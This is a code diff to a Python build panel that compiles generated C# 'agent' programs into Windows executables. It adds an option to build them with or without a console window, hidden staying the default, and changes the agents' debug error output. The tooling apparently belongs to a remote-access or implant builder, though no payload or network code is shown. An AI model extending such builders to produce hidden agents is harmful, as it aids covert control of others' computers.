@@ -1168,7 +1168,7 @@ def panel_build():
     compiler = find_csharp_compiler()
     if compiler:
         try:
-            exe_path = compile_agent(source, bc['name'], compiler)
+            exe_path = compile_agent(source, bc['name'], compiler, bc['hidden'])
             if exe_path and os.path.exists(exe_path):
                 # Save to BUILD_DIR with accessible name
                 final_name = f"{bc['name']}_{build_sig}.exe"
@@ -1218,7 +1218,7 @@ def find_csharp_compiler():
     return None
 
 
-def compile_agent(source, name, compiler):
+def compile_agent(source, name, compiler, hidden=True):
     """Compile C# source to executable"""
     build_dir = tempfile.mkdtemp(dir=Config.BUILD_DIR)
     source_path = os.path.join(build_dir, f"{name}.cs")
@@ -1227,11 +1227,13 @@ def compile_agent(source, name, compiler):
     with open(source_path, 'w', encoding='utf-8') as f:
         f.write(source)
 
+    target = 'winexe' if hidden else 'exe'
+
     # Build command based on compiler
     if 'mcs' in compiler:
         cmd = [
             compiler,
-            '-target:winexe',
+            f'-target:{target}',
             '-optimize+',
             f'-out:{exe_path}',
             '-r:System.dll',
@@ -1247,7 +1249,7 @@ def compile_agent(source, name, compiler):
     else:
         cmd = [
             compiler,
-            '/target:winexe',
+            f'/target:{target}',
             '/optimize+',
             f'/out:{exe_path}',
             '/r:System.dll',
@@ -1529,8 +1531,9 @@ def generate_agent_source(bc):
         "                }\n"
         "            } catch (Exception ex) {\n"
         "                if (_debug) {\n"
-        '                    MessageBox.Show("Fatal: " + ex.ToString(), "Debug",\n'
-        "                        MessageBoxButtons.OK, MessageBoxIcon.Error);\n"
+        '                    Console.WriteLine("FATAL: " + ex.ToString());\n'
+        '                    Console.WriteLine("Press Enter to exit...");\n'
+        "                    try { Console.ReadLine(); } catch {}\n"
         "                }\n"
         "            }\n"
         "        }\n"
